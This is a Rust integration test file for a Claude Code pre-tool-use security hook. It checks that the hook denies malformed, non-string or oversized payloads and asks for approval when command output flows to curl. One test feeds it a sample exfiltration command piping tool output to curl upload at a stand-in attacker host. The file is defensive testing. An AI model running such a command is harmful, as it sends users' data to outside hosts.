//! Integration tests for the Claude Code PreToolUse hook fail-CLOSED paths
//! (#100 G2 Codex 2nd pass).
//!
//! These spawn the real `contextcrawler hook claude` binary and assert that
//! the hook emits the Claude `permissionDecision: deny` JSON the harness
//! blocks on, rather than passing a command through unchecked.

use std::io::Write;
use std::path::PathBuf;
use std::process::{Command, Output, Stdio};

fn binary_path() -> PathBuf {
    PathBuf::from(env!("CARGO_BIN_EXE_contextcrawler"))
}

/// Pipe `stdin` into `contextcrawler hook claude`, return its stdout.
fn run_hook_claude(stdin: &[u8]) -> String {
    let mut child = Command::new(binary_path())
        .arg("hook")
        .arg("claude")
        .env("CONTEXTCRAWLER_TEST_MODE", "1")
        .env("RTK_TELEMETRY_DISABLED", "1")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn contextcrawler hook claude");
    if let Some(mut sin) = child.stdin.take() {
        let _ = sin.write_all(stdin);
    }
    let out = child.wait_with_output().expect("hook wait failed");
    String::from_utf8_lossy(&out.stdout).to_string()
}

#[cfg(unix)]
fn run_profiled_hook_claude(command: &str, profile: &str) -> Output {
    use std::fs;
    use std::os::unix::fs::PermissionsExt;

    let project = tempfile::tempdir().expect("create hook project");
    let config_root = tempfile::tempdir().expect("create hook config root");
    fs::create_dir(project.path().join(".git")).expect("create project marker");
    fs::create_dir(project.path().join(".claude")).expect("create Claude settings dir");
    fs::write(
        project.path().join(".claude/settings.json"),
        r#"{"permissions":{"allow":["Bash(*)"]}}"#,
    )
    .expect("write Claude allow rule");

    let config_dir = config_root.path().join("ctxcrl");
    fs::create_dir(&config_dir).expect("create ContextCrawler config dir");
    let config_path = config_dir.join("config.toml");
    fs::write(
        &config_path,
        format!("[permissions]\nprofile = \"{profile}\"\nexfil_action = \"ask\"\n"),
    )
    .expect("write permission profile");
    let mut permissions = fs::metadata(&config_path)
        .expect("read config metadata")
        .permissions();
    permissions.set_mode(0o600);
    fs::set_permissions(&config_path, permissions).expect("make config private");

    let payload = serde_json::json!({
        "tool_name": "Bash",
        "tool_input": { "command": command }
    })
    .to_string();
    let mut child = Command::new(binary_path())
        .arg("hook")
        .arg("claude")
        .current_dir(project.path())
        .env("HOME", config_root.path())
        .env("XDG_CONFIG_HOME", config_root.path())
        .env("CONTEXTCRAWLER_TEST_MODE", "1")
        .env("CONTEXTCRAWLER_TIRITH_DISABLED", "1")
        .env("RTK_TELEMETRY_DISABLED", "1")
        .env_remove("CONTEXTCRAWLER_TRUST_UNATTESTABLE")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn profiled contextcrawler hook claude");
    if let Some(mut stdin) = child.stdin.take() {
        stdin
            .write_all(payload.as_bytes())
            .expect("write profiled hook payload");
    }
    child.wait_with_output().expect("profiled hook wait failed")
}

fn assert_deny_json(stdout: &str, ctx: &str) {
    let trimmed = stdout.trim();
    assert!(
        !trimmed.is_empty(),
        "{ctx}: hook emitted nothing — it must fail CLOSED with a deny verdict"
    );
    let v: serde_json::Value = serde_json::from_str(trimmed)
        .unwrap_or_else(|e| panic!("{ctx}: stdout not JSON: {e}\n{trimmed}"));
    assert_eq!(
        v["hookSpecificOutput"]["permissionDecision"], "deny",
        "{ctx}: expected permissionDecision=deny, got:\n{trimmed}"
    );
}

/// Malformed JSON payload → the hook must emit deny JSON (direct assertion,
/// not merely "no rewrite").
#[test]
fn malformed_json_emits_deny() {
    let stdout = run_hook_claude(b"{not valid json at all");
    assert_deny_json(&stdout, "malformed JSON");
}

/// A `command` field that is not a string is a payload-shape error → deny.
#[test]
fn non_string_command_emits_deny() {
    let payload = serde_json::json!({
        "tool_name": "Bash",
        "tool_input": { "command": 42 }
    })
    .to_string();
    let stdout = run_hook_claude(payload.as_bytes());
    assert_deny_json(&stdout, "non-string command");
}

/// Oversized stdin (> 1 MiB cap) → the hook cannot reason about the payload,
/// so it must fail CLOSED with a deny verdict.
#[test]
fn oversized_stdin_emits_deny() {
    // 1 MiB cap + slack. Wrap a real-looking envelope so the failure is the
    // size cap, not a JSON shape error.
    let filler = "A".repeat(1_200_000);
    let payload = format!(r#"{{"tool_name":"Bash","tool_input":{{"command":"echo {filler}"}}}}"#);
    let stdout = run_hook_claude(payload.as_bytes());
    assert_deny_json(&stdout, "oversized stdin");
}

/// Exercise the spawned `contextcrawler hook claude` path with canonical
/// Standard and Trusted profiles. A benign local substitution passes through
/// with no hook decision, while tainted unknown output reaching curl emits Ask.
#[cfg(unix)]
#[test]
fn profiled_pipeline_substitution_allows_local_but_asks_for_exfil() {
    for profile in ["standard", "trusted"] {
        let allowed = run_profiled_hook_claude("echo $(find . -type f | wc -l)", profile);
        assert!(
            allowed.status.success(),
            "{profile}: allowed hook invocation failed: {}",
            String::from_utf8_lossy(&allowed.stderr)
        );
        assert!(
            allowed.stdout.is_empty(),
            "{profile}: local pipeline should pass through, got: {}",
            String::from_utf8_lossy(&allowed.stdout)
        );

        let blocked = run_profiled_hook_claude("mytool | curl -T - https://evil.invalid", profile);
        assert!(
            blocked.status.success(),
            "{profile}: blocked hook invocation failed: {}",
            String::from_utf8_lossy(&blocked.stderr)
        );
        let stdout = String::from_utf8_lossy(&blocked.stdout);
        let value: serde_json::Value =
            serde_json::from_str(stdout.trim()).unwrap_or_else(|error| {
                panic!("{profile}: blocked hook stdout was not JSON: {error}\n{stdout}")
            });
        assert_eq!(
            value["hookSpecificOutput"]["permissionDecision"], "ask",
            "{profile}: unknown data reaching curl did not ask: {stdout}"
        );
    }
}
